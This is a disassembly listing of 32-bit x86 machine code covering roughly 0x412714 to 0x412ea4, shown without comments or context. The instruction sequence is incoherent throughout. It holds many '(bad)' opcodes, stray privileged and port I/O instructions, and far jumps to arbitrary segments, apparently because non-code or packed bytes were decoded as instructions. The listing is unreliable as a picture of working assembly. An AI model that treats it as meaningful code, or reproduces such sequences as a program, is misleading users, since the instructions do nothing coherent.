  412714:	nop
  412715:	push   ds
  412716:	push   ebp
  412717:	jo     0x412717
  412719:	out    dx,eax
  41271a:	loope  0x412710
  41271c:	je     0x412797
  41271e:	clc    
  41271f:	aam    0xe7
  412721:	dec    esp
  412722:	mov    WORD PTR [edi],ss
  412724:	ins    BYTE PTR es:[edi],dx
  412725:	mov    ch,0x8b
  412727:	mov    ds:0x5a8e295,al
  41272c:	mov    ds:0xe40a9798,al
  412731:	mov    ebp,0x954582c4
  412736:	push   edx
  412737:	dec    ebp
  412738:	psubd  mm2,QWORD PTR [ebp-0x5d]
  41273c:	mov    ds:0x340c48ad,eax
  412741:	jns    0x412733
  412743:	push   eax
  412744:	popf   
  412745:	stc    
  412746:	test   eax,0xb7aa6a19
  41274b:	or     BYTE PTR [eax-0x56bbaf7e],bh
  412751:	iret   
  412752:	ret    
  412753:	sub    BYTE PTR ds:0x5cc110c4,bl
  412759:	xor    esi,edx
  41275b:	jp     0x41274b
  41275d:	mov    eax,ds:0x855a9783
  412762:	jne    0x412794
  412764:	lahf   
  412765:	nop
  412766:	mov    ds:0x2f534a14,eax
  41276b:	test   BYTE PTR [edi],0xbb
  41276e:	push   ebx
  41276f:	or     al,0x68
  412771:	and    eax,DWORD PTR [ebx]
  412773:	add    ah,BYTE PTR [eax+0x45955084]
  412779:	mov    edi,0x5c7be7c7
  41277e:	pop    es
  41277f:	(bad)  
  412780:	iret   
  412781:	ror    DWORD PTR [esi],0xab
  412784:	stos   DWORD PTR es:[edi],eax
  412785:	and    ecx,esp
  412787:	ins    BYTE PTR es:[edi],dx
  412788:	enter  0xdeb3,0x81
  41278c:	ror    BYTE PTR [edx+0x1d44ebbf],0xd2
  412793:	push   cs
  412794:	push   es
  412795:	into   
  412796:	mov    ds:0x7b2b1273,eax
  41279b:	cmp    DWORD PTR [ecx],ebp
  41279d:	ret    0xb364
  4127a0:	mov    ah,0xb6
  4127a2:	lods   al,BYTE PTR ds:[esi]
  4127a3:	inc    edx
  4127a4:	or     eax,0x5bbed023
  4127a9:	push   edx
  4127aa:	mov    es,WORD PTR [esi]
  4127ac:	cdq    
  4127ad:	lahf   
  4127ae:	(bad)  
  4127af:	cmp    ebx,DWORD PTR [ecx-0x3e]
  4127b2:	cmp    eax,0x4ceaa1b2
  4127b7:	mov    edi,0xc3807e81
  4127bc:	cli    
  4127bd:	lds    edi,FWORD PTR [esi-0x79]
  4127c0:	inc    ebx
  4127c1:	sbb    ch,ah
  4127c3:	stc    
  4127c4:	mov    al,ds:0xa102930a
  4127c9:	outs   dx,BYTE PTR ds:[esi]
  4127ca:	dec    eax
  4127cb:	xchg   esi,eax
  4127cc:	adc    bh,BYTE PTR [ebx+0x2394fbd8]
  4127d2:	add    eax,0xb4044f42
  4127d7:	push   0x8d8bdb31
  4127dc:	icebp  
  4127dd:	fs enter 0xe85a,0xa0
  4127e2:	push   eax
  4127e3:	lods   eax,DWORD PTR ds:[esi]
  4127e4:	add    bl,0xc4
  4127e7:	mov    dl,0x70
  4127e9:	stc    
  4127ea:	or     bl,BYTE PTR [ecx-0x28]
  4127ed:	or     DWORD PTR [ecx+0x5ba67e20],ebx
  4127f3:	shr    DWORD PTR [ebx-0x35],0xe6
  4127f7:	push   0x3a
  4127f9:	les    ecx,FWORD PTR [ebp-0x30bd2c22]
  4127ff:	ins    DWORD PTR es:[edi],dx
  412800:	popa   
  412801:	pop    ecx
  412802:	cmc    
  412803:	pop    esi
  412804:	mov    al,0x10
  412806:	ds sbb eax,0x82d33efe
  41280c:	(bad)  
  41280d:	jl     0x4127dc
  41280f:	cwde   
  412810:	(bad)
  412813:	fisubr WORD PTR [edi+eax*4-0x80]
  412817:	xchg   DWORD PTR [edx-0x18],esp
  41281a:	push   edi
  41281b:	pop    edi
  41281c:	lock dec edi
  41281e:	mov    ds:0xdedefbb6,eax
  412823:	and    ebp,DWORD PTR [ecx]
  412825:	push   es
  412826:	sub    dl,BYTE PTR [edi]
  412828:	adc    bl,ch
  41282a:	sbb    BYTE PTR ds:0x60747b65,ch
  412830:	ds aas 
  412832:	mov    al,ds:0xc4965cbf
  412837:	add    al,0x4d
  412839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283a:	scas   al,BYTE PTR es:[edi]
  41283b:	pop    edx
  41283c:	and    eax,0x6eac5b52
  412841:	fdivr  QWORD PTR [eax-0x47]
  412844:	jns    0x41284e
  412846:	mov    bl,dh
  412848:	cmp    BYTE PTR [ecx],dh
  41284a:	or     BYTE PTR [edi-0x33],ah
  41284d:	rcr    BYTE PTR [ebp-0x37],1
  412850:	inc    ecx
  412851:	fld    st(1)
  412853:	fldlg2 
  412855:	push   esi
  412856:	xchg   ebx,eax
  412857:	and    BYTE PTR [eax],0xf7
  41285a:	push   esp
  41285b:	(bad)  
  41285c:	rcl    edx,1
  41285e:	inc    esp
  41285f:	inc    esp
  412860:	jmp    0x8dda3ff9
  412865:	loopne 0x412851
  412867:	inc    eax
  412868:	fistp  DWORD PTR [ebp-0x473ed15b]
  41286e:	inc    ecx
  41286f:	push   ebx
  412870:	push   0x11
  412872:	inc    ebp
  412873:	adc    BYTE PTR [ebp+0x6c],ah
  412876:	mov    ds:0x7330b1ba,eax
  41287b:	stos   BYTE PTR es:[edi],al
  41287c:	jae    0x41282b
  41287e:	xchg   ecx,eax
  41287f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412880:	mov    esi,0xb03ff08d
  412885:	dec    ecx
  412886:	dec    ebp
  412887:	popa   
  412888:	cwde   
  412889:	or     bh,BYTE PTR [ebx+0x4a648beb]
  41288f:	push   edi
  412890:	pop    esp
  412891:	push   ss
  412892:	dec    edx
  412893:	dec    esi
  412894:	ror    DWORD PTR [esi-0x6a],0x1e
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	in     eax,dx
  41289a:	mov    WORD PTR [esi-0x5f],cs
  41289d:	jmp    0x6f13978a
  4128a2:	add    DWORD PTR [esi+0x6b04fd1a],ecx
  4128a8:	ds mov ebp,0x21badbca
  4128ae:	leave  
  4128af:	push   0x8eb038a5
  4128b4:	shl    BYTE PTR [ebx],0x14
  4128b7:	push   es
  4128b8:	jp     0x412892
  4128ba:	ss mov ch,ch
  4128bd:	repz or al,0xb8
  4128c0:	xor    eax,0x7c8a9d6e
  4128c5:	sub    eax,0xef5789db
  4128ca:	push   ds
  4128cb:	scas   eax,DWORD PTR es:[edi]
  4128cc:	or     esi,DWORD PTR [edi-0x71]
  4128cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d0:	rcr    BYTE PTR [esi-0x64],cl
  4128d3:	sbb    eax,0x34f3cb00
  4128d8:	mov    bl,0xd6
  4128da:	mov    ecx,0xb7bdc36f
  4128df:	push   edi
  4128e0:	inc    ebx
  4128e1:	dec    eax
  4128e2:	push   es
  4128e3:	adc    eax,0x84593eec
  4128e8:	add    edi,ebx
  4128ea:	mov    dl,ch
  4128ec:	aaa    
  4128ed:	cmp    al,0x50
  4128ef:	fidivr WORD PTR [ecx+esi*1+0x1d]
  4128f3:	xchg   ecx,eax
  4128f4:	cdq    
  4128f5:	or     DWORD PTR [edi+0x5835c59a],ebx
  4128fb:	fsub   DWORD PTR [edi]
  4128fd:	sbb    cl,cl
  4128ff:	stc    
  412900:	add    al,0x56
  412902:	jl     0x41289b
  412904:	mov    edi,0x30343bac
  412909:	rol    edx,0x19
  41290c:	xor    al,0xb
  41290e:	push   es
  41290f:	scas   al,BYTE PTR es:[edi]
  412910:	xchg   edx,eax
  412911:	clc    
  412912:	mov    WORD PTR [eax-0x33],ds
  412915:	or     ebx,esp
  412917:	xchg   edx,eax
  412918:	in     al,0xd9
  41291a:	sub    dl,cl
  41291c:	push   cs
  41291d:	dec    esp
  41291e:	xchg   DWORD PTR [ebx+0x5f722566],ecx
  412924:	into   
  412925:	cwde   
  412926:	adc    cl,dh
  412928:	call   0xf0f5:0xd229c93b
  41292f:	push   0xffffffdd
  412931:	mov    WORD PTR [ebx],fs
  412933:	pusha  
  412934:	jb     0x41298b
  412936:	bound  ebx,QWORD PTR [esp+ecx*8+0x21dc00ce]
  41293d:	cmp    al,0xdf
  41293f:	mov    ds:0x6a1958cd,eax
  412944:	jmp    0x24537c72
  412949:	adc    DWORD PTR [esp+ebx*1],esi
  41294c:	enter  0xaa3c,0xfe
  412950:	xor    al,BYTE PTR [eax+0x67]
  412953:	xor    edx,DWORD PTR [ecx-0x38]
  412956:	add    edx,DWORD PTR [ecx+0x58]
  412959:	mov    edi,ebp
  41295b:	dec    edx
  41295c:	sbb    DWORD PTR [ebp+0xa417340],esi
  412962:	push   cs
  412963:	sbb    dh,ah
  412965:	mov    DWORD PTR [edx+ebp*4+0x2d85fdc3],eax
  41296c:	mov    eax,ds:0x6ddf85b2
  412971:	adc    ecx,DWORD PTR ds:0x7be0a805
  412977:	and    dh,BYTE PTR [ebp+0x3b]
  41297a:	iret   
  41297b:	outs   dx,WORD PTR ds:[esi]
  41297d:	into   
  41297e:	loopne 0x412994
  412980:	sub    edi,ecx
  412982:	fst    QWORD PTR [edx-0x113da53d]
  412988:	std    
  412989:	jecxz  0x412989
  41298b:	ins    DWORD PTR es:[edi],dx
  41298c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41298d:	ds mov esi,0xe418ce71
  412993:	jo     0x4129a5
  412995:	mov    ch,0x85
  412997:	nop
  412998:	add    al,BYTE PTR fs:[edi]
  41299b:	inc    edi
  41299c:	dec    ecx
  41299d:	mov    ah,bl
  41299f:	clc    
  4129a0:	stos   DWORD PTR es:[edi],eax
  4129a1:	jge    0x412961
  4129a3:	mov    dh,0x61
  4129a5:	inc    ecx
  4129a6:	les    esi,FWORD PTR [esi+0x65]
  4129a9:	fs stos BYTE PTR es:[edi],al
  4129ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ac:	inc    esi
  4129ad:	pop    ecx
  4129ae:	loopne 0x4129a0
  4129b0:	xchg   esi,eax
  4129b1:	add    eax,0x3bc47c8a
  4129b6:	lahf   
  4129b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129b8:	lds    edi,FWORD PTR [ebp+0x63]
  4129bb:	test   eax,0xabf7edbb
  4129c0:	push   eax
  4129c1:	mov    cs,WORD PTR [eax+0x9f4a652]
  4129c7:	dec    ch
  4129c9:	dec    edx
  4129ca:	and    DWORD PTR gs:[edi+0xf],ecx
  4129ce:	imul   edx,DWORD PTR [esi-0x449edcaa],0x13
  4129d5:	call   0xf0c5f379
  4129da:	push   0x9b8e3ee7
  4129df:	fdiv   st(3),st
  4129e1:	dec    ebp
  4129e2:	scas   eax,DWORD PTR es:[edi]
  4129e3:	cli    
  4129e4:	imul   ebp,DWORD PTR [ebp-0x5ff56ced],0x3b
  4129eb:	cs push 0xd8f580d0
  4129f1:	fcom   DWORD PTR [edx+eiz*8]
  4129f4:	dec    esi
  4129f5:	mov    edx,0x8fb601d8
  4129fa:	fisttp QWORD PTR [esi]
  4129fc:	push   ebx
  4129fd:	fcom   DWORD PTR [edi-0x51]
  412a00:	or     ecx,DWORD PTR [eax-0x24]
  412a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a04:	call   0xef47:0x1fb49f8f
  412a0b:	xor    al,0x44
  412a0d:	test   BYTE PTR [eax-0x11],dh
  412a10:	cmc    
  412a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a12:	jbe    0x412a6e
  412a14:	mov    edx,0x7b3a91dd
  412a19:	adc    BYTE PTR [esi-0x292367b1],al
  412a1f:	fs js  0x412a2c
  412a22:	aas    
  412a23:	mov    eax,ds:0x6e6c78b4
  412a28:	push   ebp
  412a29:	test   al,0xfa
  412a2b:	mov    ecx,0x607c531c
  412a30:	mov    ch,0x74
  412a32:	imul   ecx,DWORD PTR [ecx-0x27],0xffffffff
  412a36:	lods   al,BYTE PTR ds:[esi]
  412a37:	cli    
  412a38:	bound  ebx,QWORD PTR [edx-0x1d]
  412a3b:	push   esi
  412a3c:	mov    dh,0x1e
  412a3e:	dec    ecx
  412a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a40:	xchg   edi,eax
  412a41:	scas   eax,DWORD PTR es:[edi]
  412a42:	out    dx,al
  412a43:	in     al,dx
  412a44:	and    ecx,eax
  412a46:	addr16 jmp 0xe50b0f4f
  412a4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a4d:	adc    BYTE PTR [edx+0x19365783],0x53
  412a54:	pop    es
  412a55:	mov    BYTE PTR ss:[ebx],ch
  412a58:	push   edx
  412a59:	push   0xffffffe0
  412a5b:	scas   eax,DWORD PTR es:[edi]
  412a5c:	mov    WORD PTR [edi-0x70e02210],gs
  412a62:	fld    st(0)
  412a64:	paddb  mm2,QWORD PTR [ebx+0x55]
  412a68:	pusha  
  412a69:	mov    ch,0x83
  412a6b:	(bad)  
  412a6c:	dec    esp
  412a6d:	jle    0x412a4f
  412a6f:	retf   0xb39a
  412a72:	aas    
  412a73:	inc    esp
  412a74:	sbb    BYTE PTR [ecx-0x4c],bl
  412a77:	stos   BYTE PTR es:[edi],al
  412a78:	xor    ecx,esp
  412a7a:	adc    eax,esp
  412a7c:	shl    DWORD PTR [edx+0x12d73636],0x96
  412a83:	jle    0x412a3e
  412a85:	mov    ecx,0xfd1b2d04
  412a8a:	push   edi
  412a8b:	rcr    BYTE PTR [edx],1
  412a8d:	lods   eax,DWORD PTR ds:[esi]
  412a8e:	or     eax,0xb52ff85e
  412a93:	add    eax,0x60ad8b6b
  412a98:	adc    BYTE PTR [ebx+ecx*2],dl
  412a9b:	pop    edx
  412a9c:	addr16 push edx
  412a9e:	fistp  QWORD PTR [esi-0x62d9c2d4]
  412aa4:	aam    0x43
  412aa6:	int    0x7a
  412aa8:	xchg   DWORD PTR [ecx+0x8b07338],esi
  412aae:	and    al,0x64
  412ab0:	dec    eax
  412ab1:	pop    es
  412ab2:	aam    0x3b
  412ab4:	shl    dl,cl
  412ab6:	outs   dx,BYTE PTR ds:[esi]
  412ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ab8:	pop    ds
  412ab9:	out    dx,eax
  412aba:	add    BYTE PTR gs:[esi],dh
  412abd:	pop    ecx
  412abe:	push   es
  412abf:	stos   DWORD PTR es:[edi],eax
  412ac0:	inc    edx
  412ac1:	jmp    0x8905:0xa3d72c6d
  412ac8:	stos   BYTE PTR es:[edi],al
  412ac9:	lahf   
  412aca:	das    
  412acb:	cmc    
  412acc:	sbb    al,0x7f
  412ace:	cs jmp 0x1c659f7f
  412ad4:	stos   DWORD PTR es:[edi],eax
  412ad5:	pop    ecx
  412ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ad7:	ins    DWORD PTR es:[edi],dx
  412ad8:	test   al,0x7
  412ada:	cmp    cl,BYTE PTR [edi]
  412adc:	xor    eax,0x4d6af7e2
  412ae1:	js     0x412b3d
  412ae3:	fist   DWORD PTR [ecx]
  412ae5:	jecxz  0x412b05
  412ae7:	pusha  
  412ae8:	addr16 in eax,0xd
  412aeb:	outs   dx,BYTE PTR ds:[esi]
  412aec:	ret    0x1f72
  412aef:	pop    ebp
  412af0:	je     0x412b46
  412af2:	sbb    ah,BYTE PTR [eax]
  412af4:	fcmove st,st(6)
  412af6:	dec    edx
  412af7:	pop    ds
  412af8:	outs   dx,BYTE PTR ds:[esi]
  412af9:	jge    0x412b01
  412afb:	cld    
  412afc:	je     0x412b4d
  412afe:	xchg   ebp,eax
  412aff:	mov    edx,0x77555792
  412b04:	add    ecx,esp
  412b06:	sbb    eax,0xfd60e5bb
  412b0b:	cmp    ebp,ebx
  412b0d:	pushf  
  412b0e:	mov    edx,cs
  412b10:	sti    
  412b11:	lahf   
  412b12:	mov    al,0x67
  412b14:	jo     0x412b87
  412b16:	cmp    al,0xd8
  412b18:	cmc    
  412b19:	pusha  
  412b1a:	cmp    dl,BYTE PTR [bp+si]
  412b1d:	mov    esp,0xf4ce5f14
  412b22:	or     BYTE PTR [esi+0x5925f093],dl
  412b28:	imul   ebp,DWORD PTR [edx+0x21],0x6c490566
  412b2f:	sbb    BYTE PTR [esi-0x7dc47464],ah
  412b35:	cmp    bh,al
  412b37:	pop    es
  412b38:	(bad)  
  412b39:	clc    
  412b3a:	inc    ebx
  412b3b:	mov    dh,0x1a
  412b3d:	loope  0x412b4a
  412b3f:	adc    eax,edx
  412b41:	mov    ah,0xbe
  412b43:	jne    0x412b2d
  412b45:	loop   0x412ae2
  412b47:	sub    DWORD PTR [esi+0x1860f5c0],eax
  412b4d:	cwde   
  412b4e:	arpl   WORD PTR [ebp-0x32c37e6b],si
  412b54:	das    
  412b55:	pop    eax
  412b56:	xchg   ebp,eax
  412b57:	xchg   edi,eax
  412b58:	jns    0x412bb2
  412b5a:	out    0x0,al
  412b5c:	push   esp
  412b5d:	(bad)  
  412b5e:	(bad)  
  412b5f:	icebp  
  412b60:	cmp    cl,BYTE PTR [eax]
  412b62:	cmp    cl,BYTE PTR [ebp-0x6409e0ed]
  412b68:	retf   0x4c3
  412b6b:	mov    dl,bl
  412b6d:	mov    bh,0x1f
  412b6f:	mov    ch,BYTE PTR [edx-0x1]
  412b72:	rol    BYTE PTR [edx+0x6e],cl
  412b75:	mov    dh,0x5f
  412b77:	test   DWORD PTR [ecx-0x4c],0x27478919
  412b7e:	ins    BYTE PTR es:[edi],dx
  412b7f:	push   ds
  412b80:	lods   al,BYTE PTR ds:[esi]
  412b81:	mov    ecx,0x55aa3599
  412b86:	sub    al,0xca
  412b88:	sti    
  412b89:	psubsw mm2,QWORD PTR [ebp+edi*8-0x2e]
  412b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b8f:	std    
  412b90:	data16 add BYTE PTR [eax],al
  412b93:	fild   QWORD PTR [eax]
  412b95:	das    
  412b96:	mov    eax,0xe9bbaa3
  412b9b:	adc    DWORD PTR [edx*1+0x397449e2],esi
  412ba2:	inc    ecx
  412ba3:	mov    bl,0x2
  412ba5:	pop    edi
  412ba6:	jo     0x412bfb
  412ba8:	icebp  
  412ba9:	rol    al,cl
  412bab:	dec    esi
  412bac:	cmp    eax,0x31233a90
  412bb1:	pop    ss
  412bb2:	add    DWORD PTR [eax-0xffc2700],ebx
  412bb8:	iret   
  412bb9:	das    
  412bba:	dec    BYTE PTR [eax+0x5]
  412bbd:	mov    edi,0xf0f9ab88
  412bc2:	xor    al,0xa5
  412bc4:	jnp    0x412c2b
  412bc6:	jl     0x412c05
  412bc8:	cmp    ah,BYTE PTR [esi-0x1c]
  412bcb:	push   edx
  412bcc:	xlat   BYTE PTR ds:[ebx]
  412bcd:	lods   eax,DWORD PTR ds:[esi]
  412bce:	sbb    ecx,esp
  412bd0:	and    esp,DWORD PTR [edx-0x73]
  412bd3:	pop    edi
  412bd4:	aaa    
  412bd5:	test   bl,ah
  412bd7:	sbb    eax,0xa4b939b2
  412bdc:	add    ebx,DWORD PTR [edx]
  412bde:	rol    DWORD PTR [esi-0x9],cl
  412be1:	test   edi,0x1d21b11c
  412be7:	sbb    BYTE PTR [ecx-0x4f],0xae
  412beb:	jns    0x412b9d
  412bed:	xor    al,0x4d
  412bef:	dec    ecx
  412bf0:	pop    esp
  412bf1:	or     esp,DWORD PTR [ebx+esi*1-0x7b37a12b]
  412bf8:	js     0x412bc9
  412bfa:	xor    ebx,eax
  412bfc:	mov    WORD PTR [ebx],fs
  412bfe:	pop    es
  412bff:	stos   BYTE PTR es:[edi],al
  412c00:	inc    ecx
  412c01:	dec    ebp
  412c02:	iret   
  412c03:	mov    bl,0x3f
  412c05:	loop   0x412be5
  412c07:	(bad)  
  412c08:	pop    edi
  412c09:	in     eax,0xa7
  412c0b:	out    0xa,eax
  412c0d:	aam    0x68
  412c0f:	jo     0x412c59
  412c11:	add    BYTE PTR [ebx],dl
  412c13:	pusha  
  412c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c15:	test   BYTE PTR [ebx],bh
  412c17:	aaa    
  412c18:	xchg   esp,eax
  412c19:	ret    0x3cdf
  412c1c:	push   0x6e46df95
  412c21:	add    BYTE PTR [edx-0x6b4a75fd],dl
  412c27:	sahf   
  412c28:	pop    eax
  412c29:	sbb    BYTE PTR [esi],ch
  412c2b:	cmp    dl,dh
  412c2d:	test   BYTE PTR [ecx-0xc345dbe],0xe1
  412c34:	and    esp,edx
  412c36:	div    bl
  412c38:	ins    BYTE PTR es:[edi],dx
  412c39:	cmp    cl,BYTE PTR [ebp-0x74]
  412c3c:	je     0x412bd4
  412c3e:	sbb    edx,ebx
  412c40:	inc    esp
  412c41:	push   edi
  412c42:	vandnpd xmm4,xmm0,xmm5
  412c46:	mov    al,ds:0x23f0ceec
  412c4b:	mov    cl,0x63
  412c4d:	add    ah,BYTE PTR [esi-0x38]
  412c50:	xchg   ebp,eax
  412c51:	mov    dl,0x1c
  412c53:	pop    edx
  412c54:	jmp    0x3604:0x2565d840
  412c5b:	dec    edi
  412c5c:	sbb    DWORD PTR [edx+0x506fc01],edx
  412c62:	test   BYTE PTR [eax-0x69831b7e],0xa6
  412c69:	out    dx,al
  412c6a:	retf   
  412c6b:	dec    ecx
  412c6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c6d:	imul   ebx,edi,0x42
  412c70:	sub    esp,DWORD PTR [ebx]
  412c72:	out    dx,eax
  412c73:	in     al,dx
  412c74:	ins    DWORD PTR es:[edi],dx
  412c75:	inc    esi
  412c76:	in     eax,dx
  412c77:	(bad)  
  412c78:	cmp    ecx,esi
  412c7a:	jnp    0x412c6a
  412c7c:	cwde   
  412c7d:	lea    eax,[ebx-0x4b]
  412c80:	mov    dh,0x98
  412c82:	dec    esp
  412c83:	outs   dx,BYTE PTR ds:[esi]
  412c84:	mov    dl,0x5c
  412c86:	push   esi
  412c87:	dec    edi
  412c88:	xchg   edx,eax
  412c89:	pop    edx
  412c8a:	ins    BYTE PTR es:[edi],dx
  412c8b:	adc    eax,0x834ec360
  412c90:	cs clts 
  412c93:	cmp    bh,BYTE PTR [edi+eax*1-0xe]
  412c97:	xchg   edi,eax
  412c98:	jp     0x412cd8
  412c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9c:	mov    ds:0xa246f095,al
  412ca1:	xchg   DWORD PTR [edi+edx*1],eax
  412ca4:	gs jmp 0x4105545e
  412caa:	pop    ebx
  412cab:	mov    BYTE PTR [edi+0x18],ch
  412cae:	loop   0x412cbc
  412cb0:	sti    
  412cb1:	and    DWORD PTR [ebp+0x62],0x800860a2
  412cb8:	cmp    eax,0xdc81d767
  412cbd:	or     ecx,DWORD PTR ds:0x28a01a18
  412cc3:	mov    ah,0xa5
  412cc5:	in     al,0x33
  412cc7:	daa    
  412cc8:	into   
  412cc9:	not    ah
  412ccb:	daa    
  412ccc:	add    DWORD PTR [esi+0x795640fe],eax
  412cd2:	adc    DWORD PTR [edi-0x7ef72fb5],edx
  412cd8:	ins    DWORD PTR es:[edi],dx
  412cd9:	pop    ecx
  412cda:	pop    ds
  412cdb:	repz call ebp
  412cde:	sub    eax,0x88800b40
  412ce3:	int    0x92
  412ce5:	fist   WORD PTR [esi+eax*4-0x13229d7b]
  412ced:	push   0x4f
  412cef:	inc    ebx
  412cf0:	pop    esi
  412cf1:	mov    esp,0xf65bbbe7
  412cf6:	out    0xca,al
  412cf8:	mov    eax,0xd8cf8f22
  412cfd:	inc    esi
  412cfe:	cmp    ch,BYTE PTR [edx-0x7e]
  412d01:	xor    al,0x5c
  412d03:	mov    BYTE PTR [ecx+0x2b361136],0xf6
  412d0a:	cwde   
  412d0b:	into   
  412d0c:	ret    
  412d0d:	lahf   
  412d0e:	dec    ebp
  412d0f:	jnp    0x412d3d
  412d11:	jmp    DWORD PTR [edi+0x165a8388]
  412d17:	pop    edi
  412d18:	imul   eax,DWORD PTR [ebx],0xcf8b6c8
  412d1e:	aad    0x71
  412d20:	cli    
  412d21:	sbb    DWORD PTR [ecx-0x143142e7],0xffffff8b
  412d28:	fwait
  412d29:	xor    bh,BYTE PTR [ebx]
  412d2b:	jl     0x412d54
  412d2d:	rol    dl,cl
  412d2f:	fwait
  412d30:	(bad)  
  412d31:	sar    DWORD PTR gs:[edi-0x789d7c3c],0xc
  412d39:	adc    BYTE PTR [edx+eiz*2],0x7f
  412d3d:	scas   eax,DWORD PTR es:[edi]
  412d3e:	mov    ds:0xe20203af,al
  412d43:	mov    edi,0x4c01c26a
  412d48:	sbb    ebx,DWORD PTR ds:0x2bc5b118
  412d4e:	dec    esp
  412d4f:	fcom   DWORD PTR [esi+edi*8-0x21481699]
  412d56:	push   ds
  412d57:	popa   
  412d58:	and    al,0xc3
  412d5a:	push   ebp
  412d5b:	call   0x6305:0x610644d4
  412d62:	sub    DWORD PTR [edx-0x75],eax
  412d65:	xor    DWORD PTR [ecx+0x2f],edi
  412d68:	(bad)  
  412d69:	adc    ah,BYTE PTR [esi+0x1219d1f5]
  412d6f:	dec    edx
  412d70:	leave  
  412d71:	mov    edi,0xda17e415
  412d76:	inc    ebp
  412d77:	fwait
  412d78:	rcr    ch,0x7e
  412d7b:	mov    bh,0x8c
  412d7d:	(bad)  
  412d7e:	(bad)  [esi-0x46]
  412d81:	pop    ebp
  412d82:	sar    al,cl
  412d84:	aaa    
  412d85:	dec    esi
  412d86:	pushf  
  412d87:	test   al,0x24
  412d89:	fbstp  TBYTE PTR [esi+0x64]
  412d8c:	xor    al,bl
  412d8e:	ja     0x412dfd
  412d90:	mov    bl,0x5f
  412d92:	inc    edi
  412d93:	fsubr  st(0),st
  412d95:	jns    0x412d6d
  412d97:	or     DWORD PTR [ebp+0x5f706f02],esp
  412d9d:	sub    esp,esi
  412d9f:	xchg   ebx,eax
  412da0:	pop    ds
  412da1:	jb     0x412ddd
  412da3:	pop    es
  412da4:	jge    0x412d85
  412da6:	or     eax,0x521e4fc
  412dab:	pop    es
  412dac:	sbb    BYTE PTR [ecx+ebp*8],0xcd
  412db0:	test   DWORD PTR [eax+0x39af9a8c],esp
  412db6:	mov    ah,0x7b
  412db8:	lods   al,BYTE PTR ds:[esi]
  412db9:	ret    0xd8d6
  412dbc:	pop    eax
  412dbd:	mov    ds:0x4af0a579,eax
  412dc2:	popf   
  412dc3:	pop    ebx
  412dc4:	jmp    0x4331:0xc1832e07
  412dcb:	mov    gs,WORD PTR [ebp+ebx*2+0x6db06d0a]
  412dd2:	ds dec esp
  412dd4:	loopne 0x412e11
  412dd6:	les    edi,FWORD PTR [esp+ecx*4]
  412dd9:	outs   dx,DWORD PTR ds:[esi]
  412dda:	xor    dh,0x3
  412ddd:	stos   BYTE PTR es:[edi],al
  412dde:	push   es
  412ddf:	xchg   edx,eax
  412de0:	out    dx,al
  412de1:	sbb    dh,cl
  412de3:	add    ah,BYTE PTR [esp]
  412de6:	jl     0x412d86
  412de8:	mov    ebp,0x52dbe55e
  412ded:	adc    al,0xef
  412def:	push   0x66
  412df1:	pop    ss
  412df2:	jo     0x412e69
  412df4:	aas    
  412df5:	lahf   
  412df6:	sub    al,0x82
  412df8:	and    cl,al
  412dfa:	pop    esi
  412dfb:	ja     0x412ddd
  412dfd:	rcr    DWORD PTR [edi-0x6c213fe9],0x1b
  412e04:	xor    eax,0xd82fadc9
  412e09:	retf   0x9d04
  412e0c:	stos   BYTE PTR es:[edi],al
  412e0d:	dec    BYTE PTR [edx+0x19]
  412e10:	dec    edi
  412e11:	or     BYTE PTR [edx+ecx*2+0x1d597633],bh
  412e18:	sub    al,0x55
  412e1a:	jo     0x412e24
  412e1c:	hlt    
  412e1d:	jge    0x412dfd
  412e1f:	push   ss
  412e20:	and    BYTE PTR [ecx+0x2bc91de6],dh
  412e26:	clc    
  412e27:	out    0x57,eax
  412e29:	mov    ds:0xb073facf,eax
  412e2e:	inc    esp
  412e2f:	push   esi
  412e30:	adc    eax,0x90fccaea
  412e35:	xchg   ecx,eax
  412e36:	sub    DWORD PTR [esi-0x551d2ca3],esi
  412e3c:	aad    0xa5
  412e3e:	popf   
  412e3f:	add    eax,0x5ab335c3
  412e44:	mov    ecx,0xd4d4170
  412e49:	ror    BYTE PTR [ebp-0x18],1
  412e4c:	mov    ah,0x3
  412e4e:	scas   al,BYTE PTR es:[edi]
  412e4f:	mov    cl,0xc5
  412e51:	mov    bh,0xb7
  412e53:	bound  ebx,QWORD PTR [esi+0x5c3123a2]
  412e59:	sub    cl,dh
  412e5b:	std    
  412e5c:	add    eax,0x2903d130
  412e61:	pushf  
  412e62:	add    BYTE PTR [esi],al
  412e64:	pop    ebx
  412e65:	adc    eax,0x4de3a50e
  412e6a:	dec    esi
  412e6b:	bound  edx,QWORD PTR [ebx]
  412e6d:	pop    ecx
  412e6e:	push   eax
  412e6f:	push   ebx
  412e70:	inc    ebx
  412e71:	sti    
  412e72:	test   DWORD PTR [ebp-0x54],esi
  412e75:	xchg   edi,eax
  412e76:	sbb    BYTE PTR [esi],cl
  412e78:	xchg   BYTE PTR [esi],bh
  412e7a:	or     al,0x89
  412e7c:	pop    ss
  412e7d:	inc    esp
  412e7e:	adc    al,0xcf
  412e80:	out    0x30,eax
  412e82:	inc    esi
  412e83:	dec    eax
  412e84:	mov    ebx,0x886363be
  412e8a:	jmp    0xbb64:0xf9d5f5b8
  412e91:	call   0xc282e02b
  412e96:	add    DWORD PTR [esi+0x5ec783e3],edx
  412e9c:	ins    DWORD PTR es:[edi],dx
  412e9d:	and    eax,0xd0947ae7
  412ea2:	push   ds
  412ea3:	pop    ebp
  412ea4:	mov    bl,0xa
